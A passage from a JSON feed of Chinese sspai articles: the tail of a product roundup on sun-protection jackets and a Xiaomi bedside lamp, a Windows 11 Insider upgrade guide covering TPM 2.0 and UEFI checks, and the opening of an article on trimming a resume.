分钟左右。在上述户外天气无遮挡的情况下，短短的 8 分钟对个人来说，每一步都是自我毅力提升的考验，尤其是等红绿灯的时候。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/27/b2814f453dd528b99dd1e8fb2e272a91.png\"><figcaption>烈日下红绿灯的考验</figcaption></figure><p>实际上我可以选择带着遮阳伞出门，在物理防晒效果上是首选。可我的行动习惯，出门是不喜欢双手拿个什么东西的，会觉得很累赘（只有我一个人是这样吗？）。于是，能全身覆盖防晒、轻便出门、无负物感的防晒风衣成了我夏日户外走动的最优解。</p>\n<p>迪卡侬的这两款防晒风衣体验下来，只能陈述主观体验，因为没有检测紫外线的机器。</p>\n<p>其厚薄的程度，在上身后并不会觉得自己是真的穿了一件外套，有时候行走起来会忘记自己还穿了一件衣服。这里促使个人产生忘记风衣的原因，是由于材质和开孔的设计让其透气性能表现出色，有风迎面而来时，真的能感受到风穿过衣服，多少有一点站在树荫下乘风的快感。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/27/293182f2930c534460dc1839f36623a1.png\"><figcaption>防晒风衣一览图</figcaption></figure><p>至于是否能阻挡 99% 的紫外线，我不能肯定，但吊牌的说明部分是明确该种材料的 UPF 评级为 50+，也即为优秀紫外线保护。户外暴晒行走已经没有之前炽热的疼痛感，更多是一种无惧太阳的自在感，再也不用怕突然晒黑了。</p>\n<p>仅仅是防晒风衣，我觉得稍微欠缺了一点，风衣对于面部的防晒不是特别到位。这里可以搭配鸭舌帽，再套上其帽子，上半身的覆盖程度就剩一张脸了。如口罩也戴上，那几乎处于防晒的无敌状态。</p>\n<p>另外，非常值得说的是，这两款防晒风衣的材质极其地轻薄。折叠收纳后，也仅和一台手机大小相当。由于我平常很懒，根本不会收纳起来，所以我是直接塞包里的，但轻薄的材质让其放包里也不会占用大多的空间，而且重量是可以忽略不计。以后每到夏天，我的背包就多了一件常驻装备。</p>\n<p>市场上防晒风衣的品牌很多，价位从 20 元~200 元不等，TB 一搜「防晒风衣」，眼睛直接花掉，完全不知道选哪件。那为何会选择迪卡侬呢 ？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/27/47165956b7e0d11ad0df98cb6dbc096d.png\"><figcaption>小小太阳雨也不怕</figcaption></figure><p>是因为去年购买的两件迪卡侬衣服（「三合一冲锋衣」和「徒步防水风衣」）的防水性能是真的远超预期。冬天里下点小雨，完全不需要撑伞，套上帽子就完事。春节在家外出写稿时，小雨中步行 30 分钟至咖啡馆，完全没有任何渗透，外层挂满了水珠，内层依然干燥。其品质的表现，让我十分信服迪卡侬这个品牌在户外运动方面的能力。最后在合理价格的加持下，很多时候看运动器具，都首选迪卡侬了。</p>\n<p>备注①：这两款防晒风衣的防泼水功能，是有时效性的。根据官网信息，推荐每 3 次洗涤之后进行防泼水的修复处理。但我去线下店问工作人员，得到的回答是这款防晒风衣正常洗涤即可，防泼水处理是不需要做的。</p>\n<p>备注②：UPF 评级为 50+，能阻挡 99% 的紫外线。</p>\n<h2>@Peggy_：米家床头灯 2 代 </h2>\n<ul>\n<li>入手渠道：淘宝</li>\n<li>入手价格：169 元</li>\n</ul>\n<p>新搬入租住的房子后，我陆陆续续添置了一些必备的智能家居，之前我需要跑到开关前才能开灯，现如今我更喜欢在打开家门的时候顺嘴喊 Siri 帮我打开米家台灯 1S，这个过程仿佛是家对我的一种欢迎仪式。除了台灯以外，出于专物专用的执拗想法，我一直想要给床头桌上添置一个专门的床头灯，以省去入睡前还要下床关灯的不便。</p>\n<p>在经历了米家床头灯 2 代漫长的缺货期后，我一度想要再购买一个台灯 1S 作为床头灯使用，好在几经等待米家床头灯 2 代终于有货了。相比于其他常规款式的床头灯，我更看重米家床头灯 2 代对于 Homekit 的支持；此外，在任何一款 app 的宣传图上，米家床头灯 2 代均以一种干净、素雅的形态出现，因此颜值也是我考虑购买它的一大原因。</p>\n<p>在拿到这款床头灯后，我最先注意到的就是它那和小米台灯 1S 一样硕大的插头，如果房间的插座布局一般的话，这个硕大的插头就会时时刻刻在插线板上强势地彰显自己的存在感。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/30/9a1b046b491caa5cb56086c213b9d05f.JPEG\"><figcaption>实际的效果 | 照骗效果</figcaption></figure><p>而到了具体使用阶段，我对于米家床头灯 2 代的智能功能还算满意，但是需要注意的是如果你仅仅使用苹果内置的家庭应用，产品宣称的彩光模式便无法完全享用到，仅在用户使用米家应用时，才能体验到全部的灯光效果，不过就我个人的使用习惯来说，我似乎并不会想要一盏五颜六色的灯。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/30/5d5a6016bd008544b94c51717b176e59.JPEG\"><figcaption>不同应用下的控制效果对比</figcaption></figure><p>来到夜间，米家床头灯的光照效果只能说是差强人意，如果你在购买前调整好自己的心理预期，即你需要的仅仅是一个能够辅助照明的昏暗夜灯，那么米家床头灯 2 代完全能满足你的需求。但是如果你需要的是一个代替卧室灯进行照明的主光源，那么或许米家床头灯 2 代并非最佳选择。毕竟小米台灯 1S 只要 149 元就能带来更好的照明效果，而米家床头灯 2 代还要贵上 20 元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/30/6a75c7085911166cc39199bc750fbb7e.JPEG\"></figure><p>总之，米家床头灯 2 代的产品定位足够清晰，作为一款床头灯它足够尽职尽责，隐藏好插头后它也可以足够美观大方，如果你想要就一盏床头灯，那么它会是一个不错的选择；但是如果你对于夜间光照度有更高的要求，或许应该考虑其他灯具。</p>\n<h2>彩蛋</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/d4a37601b2ac8462f9f7142c155b2c82.gif\"><figcaption>赛博军火</figcaption></figure><p><strong>如果你也想分享「新玩意」🔉：</strong></p>\n<p>很多读者表示自己也有一些希望分享的有趣产品。为了能让更多读者参与，我们决定在「新玩意」栏目最后添加一个新的版块，邀请大家来 Matrix 社区发表文章分享你的「新玩意」，你只需要：</p>\n<ul>\n<li>在标题中标注「新玩意」</li>\n<li>用 500-1000 字介绍产品</li>\n<li>配上 1-2 张产品的实拍图片</li>\n<li><strong>在网站个人信息中补充支付宝账号</strong></li>\n</ul>\n<p>成功入选栏目还可以得到 108 元的「剁手抚恤金」🧧。如果你有兴趣参与，就赶紧来稿吧！</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a> ，了解更多的新玩意 🆒</p>\n<p>&gt; 特惠、好用的硬件产品，尽在 <a href=\"https://shop549593764.taobao.com/?spm=a230r.7195193.1997079397.2.2ddc7e0bPqKQHc\">少数派sspai官方店铺</a> 🛒</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67510"},{"title":"升级 Windows 11 碰壁了？送你一份尝鲜指南","date":"2021-07-01 08:00:00","description":"\n<p>本周，<a href=\"https://sspai.com/post/67413\">Windows 11</a> 开始通过 Windows Insider Dev 通道向部分用户进行推送，但想要尝鲜却被 Windows 11 拒之门外的用户不在少数。</p>\n<p>Windows 11 对设备的硬件配置究竟有什么要求，你的设备如何升级到 Windows 11？</p>\n<p>基于微软目前给出的相关文档、信息和部分用户的实际体验，本文整理了 Windows 11 尝鲜相关的常见问题，希望能够为你提供一些参考。</p>\n<h2>何时能升级</h2>\n<p>Windows 11 的首个预览版本 22000.51 已于 6 月 29 日面向 Windows Insider 推送，如果你的设备满足硬件配置要求，同时加入了 Windows 预览体验计划的 Dev 渠道，直接在设置中检查更新即可通过 OTA 升级，步骤与常规系统更新无异。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/dfccff183629643e299bf6eaa4d3c2fa\"></figure><p>当然，预览版本的稳定性逊于正式版，Dev 渠道的代码未经过严格的可靠性验证，有较大几率出现影响正常使用的 bug。如果 Windows 是你的主要操作系统，我建议等待 Beta 渠道或 Release Preview 渠道开放后再考虑升级，不要贸然使用生产力设备尝鲜。</p>\n<p>目前微软并未公布 Windows 11 正式版的具体推送日期，<strong>仅表示将在今年晚些时候推出</strong>，正在运行 Windows 10 的设备将在 2022 年上半年收到免费更新。</p>\n<p>但发布会上的诸多暗示，以及沃尔玛等零售商的宣传语都指向了同一时间点。比如 The Verge 发布的一篇 <a href=\"https://www.theverge.com/2021/6/28/22553666/microsoft-windows-11-october-20th-release-date-hint-rumor\">报道</a> 就指出，Windows 11 的正式推送时间或许会在今年 10 月，因为在不久前的 Windows 发布会中微软埋下了多处暗藏 Windows 11 正式推送日期的细节，包括 Microsoft Teams 对话消息、任务栏时间、日历事件、OneDrive 照片回顾等等，这些截图中的日期都指向了<strong> 2021 年 10 月 20 日</strong>。</p>\n<h2>哪些设备能升级</h2>\n<p>和当年的 Windows 10 类似，微软为推广 Windows 11 又一次祭出了「免费升级」大法，上一次是 Windows 7 和 Windows 8.x 的消费级版本可以免费升级至 Windows 10，这一次则是「符合要求的 Windows 10」可以免费升级到 Windows 11。</p>\n<p>虽然都是免费的跨版本升级，措辞的变化也暗示着 Windows 11 对我们的设备有了新要求。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/bf838638b9e875cd872ce68e8378d8fd\"></figure><p>从这张最新的 Windows 11 系统要求中不难看出，要想「符合要求」并获得免费升级其实存在一定的硬件门槛。首先是 Windows 11 不存在 32 位版本，因此处理器必须支持 64 位，对应的就是内存达到 4GB 以上，存储空间也至少为 64GB。</p>\n<p>但真正的难点，也是这次卡住很多人的关键，则是<strong>支持 UEFI 安全启动</strong>以及<strong>受信任的平台模块 (TPM) 2.0 版本</strong>。</p>\n<h3>UEFI 安全启动</h3>\n<p>因为当年需要让 Windows 7 和 Windows 8.1 用户平滑升级，因此 Windows 10 的最低系统要求几乎延续了 Windows 7 的要求，包括并不强制要求 UEFI 安全启动（Only UEFI）。</p>\n<p>情况在 Windows 11 这里有了变化。</p>\n<p>简单来说，在 Windows XP 时代我们只有 BIOS 启动，对应的磁盘分区结构则是 MBR，这样的结构一方面安全性较差，很多恶意程序可以在系统启动前就加载，另一方面最高也只能够支持到四个主分区，最高支持硬盘容量为 2TB。</p>\n<p>因此之后就出现了 BIOS 的高级版本 UFEI，对应的分区表也采用了更新的 GPT。虽然 UEFI 在 2007 年就已经出现了，由于 Windows 7 开发时并没有成为标准，2012 年以后的 PC 虽然大多出厂就带有 UEFI 支持，为了兼容性（安装 Windows 7）还是会允许用户打开 Legacy 兼容模式来安装 Windows 7 或 32 位操作系统。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/1b4ebdeaa59e46cdbe24150bb125781e\"></figure><p>而到了 Windows 11 ，因为只支持 64 位操作系统，从安全性考虑就<strong>只允许采用 UEFI 安全启动</strong>的方式进行引导，也就是在系统 BIOS 中设置为「only UEFI」并且关闭 Legacy 兼容模式，这样才能正常的安装、运行 Windows 11。</p>\n<h3>TPM 2.0</h3>\n<p>UEFI 支持其实并不是这一次 Windows 11 系统要求中最为苛刻的，更苛刻的是系统最低要求中强制需要可信平台模块 2.0（TPM 2.0）。TPM 中文名叫做<strong>可信平台模块</strong>，英文 Trusted Platform Module，简单来说就是一个以硬件形式处理设备加密的工具，可以保护当前硬件设备的数据不被破解。</p>\n<p>目前市面上的电脑如果支持 TPM ，一般上分为两种：</p>\n<ul><li>基于处理器主板的 TPM</li></ul>\n<p>在很多的品牌主板上都有集成，比如如果是 Intel 处理器上的主板，那么在 BIOS 里面会有个 Intel Platform Trust Technology 设置项目，而 AMD 处理器的主板有个类似的叫做 fTPM。它们都是属于集成的 TPM，如果你有相关设备，升级前记得打开即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/3b9c9aeaea8e50310db5ba99e6208744\"></figure><ul><li>基于独立加密模块的 TPM</li></ul>\n<p>有些主板中并没有集成Intel PTT或者 AMD 的 fTPM，那么就需要使用单独的芯片模块来实现 TPM 加密了。这个小模块通过针脚和主板进行通信，从而实现 TPM 功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/cbf37f402769790bf203e8e4ea043034\"></figure><p>当然微软也并没有完全说死 TPM 2.0 的支持，考虑到 OEM 设备商的利益（很多厂商从法律法规或利润最大化的角度并不会安装 TPM），微软在其最新的一版硬件需求说明文档中进行了特殊备注，表示可以允许经过其认证的设备在没有安装 TPM 2.0 的情况下预装 Windows 11 出货，因此最终的硬件支持上还要等待下半年正式版发货才能最终确定。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/35add06fcd4485cecfe0e8d4c0423cbf\"></figure><h3>如何自检</h3>\n<p>微软在 Windows 11 发布活动的第一时间推出过一款硬件检查软件「电脑健康状况检查工具」，方便用户检测当前的设备是否满足升级到 Windows 11 的硬件需求。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/9d365642e9a7af28a2d90ea13ec23899\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/a1b9475def0df2d034a5b3da9c753515\"></figure><p>打开软件之后点击「立即检查」就可以识别当前的硬件是否支持升级到 Windows 11，发布之初，这款工具并不会指出不符合的硬件到底哪一项不符合，虽然在之后的更新中解决，但微软还是决定暂时下线检查工具，进一步完善后重新推出。现在，我们可以通过一款第三方应用来进行检测。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/85fd2fa026420b9c35093dcad279d115\"></figure><p>这款名为「<a href=\"https://github.com/rcmaehl/WhyNotWin11\" target=\"_blank\">WhyNotWin11</a>」的检查工具相比微软的检查工具提供了更为全面的信息，既包括了硬件中不符合最低硬件标准的信息项目，也包含了显卡支持等情况，相对来说信息要更为准确详细。</p>\n<h3>升级后的 Insider 提示判断</h3>\n<p>纵使系统硬件不支持，但我们依然可以使用各种「方法」升级到 Windows 11。但可以升级到 Windows 11 不代表万事大吉，微软将会在未来限制这些硬件能否使用正式版 Windows 11，甚至完全不满足的设备连 dev 测试版都将不再推送。</p>\n<p>如果你已经在 Insider 中了，那么你可以通过「设置」- 「Windows 更新」-「Windows 预览体验计划」的提示信息查看自己的电脑是否符合正式版的需求还是只能呆在测试版。目前有三种情况：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/ede278dcb58890672e772b4b055042a9\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/3ff21e6484f2a3fe4c512eb9b59ca847\"></figure><p>本次 Windows 11 Dev 测试中，所有种类的 CPU 和是否具备 TPM 的电脑都将可以参与测试，但只要不支持 TPM 那么在「Windows 预览体验计划」的提示信息一定是红色的；未来正式版只推送给具备 TPM 2.0 和具备 <a href=\"https://docs.microsoft.com/en-us/windows-hardware/design/minimum/windows-processor-requirements\" target=\"_blank\">兼容</a> 处理器的电脑，当然也不排除 <a href=\"https://blogs.windows.com/windows-insider/2021/06/28/update-on-windows-11-minimum-system-requirements/\" target=\"_blank\">下放</a> 给 7 代 Intel 和 AMD Zen 1 处理器的可能性。</p>\n<h2>如何升级</h2>\n<h3>排查环境问题</h3>\n<p>鉴于上面提到的升级条件，你的设备如果在升级时遇到了阻碍，不妨先使用按照以下流程检查一下 TPM 相关原因：</p>\n<p>若想了解当前设备是否支持 TPM，最简单的方法是以管理员身份运行 PowerShell，键入 <code>Get-Tpm</code> 指令并回车。<code>TpmPresent</code> 的值为 <code>True</code> 则代表硬件已集成 TPM 组件，<code>TpmReady</code> 为 <code>True</code> 代表 TPM 符合系统标准，其它信息的含义可参考 <a href=\"https://docs.microsoft.com/zh-cn/powershell/module/trustedplatformmodule/get-tpm\">微软官方文档</a>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/ac479b47911ceb0a298a85595a9f176f\"></figure><p>命令行提示不支持也不必灰心，让我们首先确认主板型号。使用快捷键 <code>Win+R</code> 然后运行 <code>Msinfo32</code> 打开系统信息面板，然后就能在右侧窗格中找到主板制造商和主板产品：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/e49727b0dbcbc6882d22f5ed2cb3a03a\"></figure><p>如果你和我一样使用的是 OEM 主机，获取到主板型号后可能还需要在相关品牌官网给出的信息中进一步查看实际主板型号，比如这里惠普 843B 主板对应的实际型号就是 Intel H370：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/1cdea1fc29d9c6e9649f01598082b7de\"></figure><p>通过对 Intel H370 的主板信息进行检索可以进一步获悉，这块主板默认是支持 TPM 加密的，因此不排除 BIOS 屏蔽了相关选项。于是在进入 BIOS 并开启 TPM 开关后，我的设备成功满足了 Windows 11 Insider 的所有配置要求。</p>\n<h3>加入 Windows 预览体验计划</h3>\n<p>扫清硬件障碍后，请打开「设置」，依次进入「更新和安全」-「Windows 预览体验计划」，按提示加入「Dev 渠道」，再次检查更新，即可无缝升级至 Windows 11。成功上车后，在其它渠道开放前无法切换测试组，全新安装才能降级到稳定版本，请务必留心。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/af1577f1c1c9a02733295b4d39fa3e1f\"></figure><p>即使你的设备不满足 Windows 11 的全部硬件要求，也可以通过 Windows 预览体验计划暂时绕过限制。微软表示，6 月 24 日前加入 Dev 渠道的先行者们甚至可无视 TPM，继续收到更新推送。这一部分用户反馈的问题会被标记为「在不兼容设备上运行」，提交的 bug 可能不会被修复。</p>\n<p>据微软说辞，Windows 11 正式发布后，不符合条件的设备会被踢出 Windows 预览体验计划，必须重新降级至 Windows 10——考虑到微软的作风，我对这条政策的实际执行力度持保留看法。但保不准微软这次就巨硬了，届时还想升级的话，手动安装镜像文件是个好方法。</p>\n<h3>通过 ISO 镜像手动升级</h3>\n<p>跨越版本号的重大系统更新，最稳妥的方法还是通过 ISO 镜像文件手动安装。由于微软尚未释出 Windows 11 的官方镜像文件，在本文发布的时间点，少数派不建议采用此方式升级，并提醒大家注意网络镜像版本与来源，避免个人数据丢失等意外情况出现。</p>\n<p>你可以在 <a href=\"https://www.microsoft.com/en-us/software-download/windowsinsiderpreviewiso\">这里</a> 检查官方 Windows 预览版本镜像，出现 Windows 11 选项后根据个人需求下载，选择保留数据或全新安装。</p>\n<h2>有什么新功能</h2>\n<h3>首个预览版简单体验</h3>\n<p>在此之前，我们已经 <a href=\"https://sspai.com/post/67328\">上手</a> 过 Window 11 早期泄露版本，见到了新的配置向导、任务栏、开始菜单、操作中心和图标。但是在正式上手 Window 11 第一个测试版本（Build 22000.51）以后还是被细节惊艳到了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/afc627933fe29eca74c58f32eb259eac\"><figcaption>左：云母石，右：亚克力</figcaption></figure><p>首先是更现代更好看的设置界面，除了新图标，设置背景还采用了 <a href=\"https://docs.microsoft.com/zh-tw/windows/apps/design/signature-experiences/materials\">云母石</a> 的材质，把原本单调的背景变得更加生动。而且相比于旧版空旷的设置界面，新的设置界面信息密度明显更高；还有常驻于侧边栏的一级设置，方便用户快速回到上级菜单或是跳转到其他设置中。最后，新的设置对可以点击的地方做了箭头指示，相比旧版更加清晰明了。当然控制面板目前还在。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/f6a1dedb99a7a786a8aae598cac6a325\"><figcaption>个性化设置</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/904a3ee9eeae4e88192e1da92998bc69\"><figcaption>新版资源管理器</figcaption></figure><p>接下来就是日常中用得多的文件管理器也焕然一新，不仅把老旧的 Ribbon 组件给全部砍掉了，还用上了云母石材质和新的图标设计，显得更加简约简约现代。此外，系统级右键菜单也得到了改进全新的设计，变得更加直观明了；当然目前新右键菜单的功能并不算完善，如果想要访问旧版菜单可以使用新版菜单下的「显示更多选项」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/9bfc9bc256654647cc257ef37e350c7b\"><figcaption>新版右键菜单</figcaption></figure><p>再者就是一些细节上的更新了，比方说通知中心、日期时间面板、快捷操作面板和输入法的重构，让整体可读性和易用性变得更好了。系统默认的终端也变成了更现代的 Windows Terminal；AutoHDR 也对部分游戏启用了，打开支持的游戏时会有启用通知。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/3881c8735468a57e1e7d889053deaec5\"><figcaption>通知中心和日期、时间面板</figcaption></figure><p>最后，Windows 11 中的音效也有不小的改进，总得来说就是更加悦耳了，大家可以去网上找找有关视频。</p>\n<h3>这些旧功能被砍掉了</h3>\n<p>Windows 11 砍掉了不少来自 Window 10 的特性，下面我们一起来梳理下这些被砍掉的「新」功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/08e71f6c5e6925c41c4f6051f3a017ff\"></figure><p>首先是，Windows 10 刚推出时被赋予重任的语音助手 Cortana 终于不预装在系统里了，不仅是首次配置向导中不会被突如其来的语音吓到，任务栏上也不会出现用不到的图标了。喜欢 Cortana 的小伙伴依然即可从 Windows 11 的应用商店下载到它。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/0861434c9b84d1fa3d171b941f149208\"></figure><p>其次，IE 在 Windows 11 中正式被禁用，这意味着长达 25 年的浏览器正式下岗了。微软建议由 IE 使用需求的用户用 Microsoft Edge 的 IE 模式替代。不过话又说回来，目前不少政府的系统已经面向 Chrome 类浏览器开发了，大部分使用 IE 的场景都是为了用网银系统，希望国内的银行可以赶紧跟进。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/2685ed97d9e2730162f66491fc0ca021\"></figure><p>图源：<a href=\"https://sspai.com/post/43818\">时间线、新 UI、字体商店……Windows 10 春季创意者有这些新功能</a></p>\n<p>再者 Windows 10 的时间轴功能也被砍了。时间线是 18 年 4 月份引入的功能，它能帮你记录你在什么时间在电脑上做了什么，方便你回溯操作。然而实际体验真的差到不行，操作界面不仅卡顿，而且大部分软件还不支持时间线的功能，甚至是第一方应用窗口截图都是空白的。现在在 Windows 11 里这个功能被彻底砍掉了。</p>\n<p>最后由于 Windows 11 采用了新的开始菜单和任务栏，所以不少我们熟知的功能也都不见了，比如：动态磁贴、可对开始菜单调整大小、应用程序组等，而且任务栏目前也只能固定在屏幕底部，21H1 中加入的新闻与兴趣也被重新集成到小部件里了；此外平板模式也从 Windows 11 里移除了，新功能将体现在键盘的连接和分离状态中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/dfacf73523add49c89a2352132acd82a.gif\"><figcaption>键盘分离、连接状态下任务栏的变化</figcaption></figure><p>其他被砍掉的功能可以看 <a href=\"https://www.microsoft.com/zh-cn/windows/windows-11-specifications#primaryR4\">这里</a>。总的来说 Windows 11 砍掉了不少 Windows 10 的特性，但是更早以前系统的组件却还保留着，让人不禁怀疑 Windows 10 是不是到头来什么都没有更新。</p>\n<h2>小结</h2>\n<p>如果你在更新后遇到了部分应用内文字乱码、游戏无法启动等问题，不妨检查一下「时间 &amp; 语言 &gt; 语言 &amp; 区域」设置中的「管理语言设置」选项，确保其中「非 Unicode 程序的语言」为 <code>中文(简体, 中国)</code>。这个操作对部分应用和游戏有效（比如《英雄联盟》）但不保证能够解决所有问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/0bb29cb21352292d59f2dc276a1529bd\"></figure><p>除此之外，目前 Windows 11 Dev 频道的预览体验版本还有着诸多其他问题，如多账户用户在升级后无法启动设置界面、搜索界面偶尔无法正常加载图标等等。你可以在微软官方 <a href=\"https://blogs.windows.com/windows-insider/2021/06/28/announcing-the-first-insider-preview-for-windows-11/\" target=\"_blank\">博客</a> 的末尾查看这些问题，再决定是否升级。</p>\n<p><strong>关联阅读：</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/67413\" target=\"_blank\">Windows 11 要更新了，这些变化能让你心动吗？</a></li>\n<li><a href=\"https://sspai.com/post/67328\" target=\"_blank\">这就是下一代的 Windows？Windows 11 泄露版上手体验</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，探索更有趣的数字生活 💸</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67498"},{"title":"极简主义下，简历也能断舍离","date":"2021-07-01 06:31:02","description":"\n<p><strong>Matrix 首页推荐</strong></p>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>《怦然心动的人生整理魔法》可谓是极简主义的圣经，大家沿用书中的断舍离方法把自己的生活整理地井井有条。近来帮不少朋友看了简历，忽然想到，是不是可以利用类似的方法来修改简历。</p>\n<h2><strong>怎么改，改什么？</strong></h2>\n<p>要改简历，首先要明确什么是优秀的简历。因为之前的几份工作都组建过团队，看过不少简历。在浏览了上百份简历之后，我认为优秀的简历主要有以下特点：</p>\n<ul>\n<li>简洁明了：能用一句话讲清楚的，绝不用废话来修饰；</li>\n<li>重点突出：做了什么贡献，完成了什么项目，都能明明白白地展示出来；</li>\n<li>上下连贯：职业发展路径明确，每份工作做了多久，每个项目做了多久，前后能够串起来；</li>\n<li>密切相关：之前的工作/项目经历和申请机会的要求密切相关了。</li>\n<li>简单易懂：简历的读者并不一定完全是相关背景出身，比如猎头/招聘经理，所以要过他们这一关，好简历必须简单易懂。</li>\n</ul>\n<p>具备这些特点的简历能大大增加你获得面试的概率，最终也能帮你找到更好的工作。反之，糟糕的简历充斥着各种问题，所以我们不妨试着用断舍离的方法来重新修改自己的简历：</p>\n<ol>\n<li>明确目标</li>\n<li>审视经历</li>\n<li>调整简历</li>\n</ol>\n<p>下面我们结合具体例子来讲讲每一步怎么做。</p>\n<h2><strong>明确目标</strong></h2>\n<p>断舍离的第一步就是要明确自己的目标是什么，修改简历的第一步也是如此，我们要明确这份简历的目标是什么。到底是校招呢，还是社招呢？到底是要找技术类的工作呢，还是销售类的工作？技术类的工作想找微软的呢，还是 Apple 的呢？每一个答案都对应着不太一样的简历，所以这是我们改简历的第一步。</p>\n<p>有了目标之后，我们可以把相关工作机会的招聘要求找出来，然后分析一下他们有没有什么共性，各自又有什么特点，然后我们可以有的放矢了。</p>\n<p>比如下面两个都是高级 iOS 开发工程师的职位要求，我们可以看到他们有些共同要求：</p>\n<ul>\n<li>熟练掌握 iOS app 的开发技能；</li>\n<li>对代码质量有很高的要求；</li>\n<li>良好的团队协作能力；</li>\n</ul>\n<p>当然也有不少差异，比如第一份明确要求搬到加拿大工作，比如第二份工作明确要求带队/带人，而且第二份工作的要求要比第一份工作要细致得多。</p>\n<blockquote>\n<p>Who we're looking for:</p>\n<p>5+ years of experience building iOS apps</p>\n<p>Desire and passion to create amazing customer experiences</p>\n<p>Strong knowledge of iOS and the Apple developer ecosystem</p>\n<p>Experience working on an app team (not just alone)</p>\n<p>Ability to work with others including a back-end API team</p>\n<p>Commitment to automated testing and high-quality code</p>\n<p>Applicants must be eligible to work in Canada and willing to relocate</p>\n</blockquote>\n<blockquote>\n<p>Key ingredients:</p>\n<p>Experience releasing and maintaining live iOS/Cocoa applications.</p>\n<p>Finger on the pulse of the latest iOS/Swift trends.</p>\n<p>Ability to write expressive, readable, composable, and testable Swift code.</p>\n<p>Basic understanding of iOS provisioning profiles and certification.</p>\n<p>Demonstrable understanding of the iOS application &amp; view lifecycles.</p>\n<p>Understanding of functional &amp; reactive programming.</p>\n<p>Observance of Clean architectural and coding principles.</p>\n<p>Good problem-solving skills.</p>\n<p>Excellent verbal communication skills.</p>\n<p>Takes initiative on new ideas/leading by example.</p>\n<p>Desire to mentor and share knowledge with engineers of all levels.</p>\n<p>Willingness to constantly improve quality standards. Gives and takes constructive criticism with maturity.</p>\n<p>Ability to apply newly-learned knowledge/patterns quickly to write better code.</p>\n</blockquote>\n<p>通过以上分析，我们就可以进一步明确找高级 iOS 开发的要求了，所以在简历中就需要突出这三块能力：</p>\n<ol>\n<li>熟练掌握 iOS app 的开发技能；</li>\n<li>对代码质量有很高的要求；</li>\n<li>良好的团队协作能力；</li>\n</ol>\n<p>当然，如果我们只想做 IC（individual contributor) 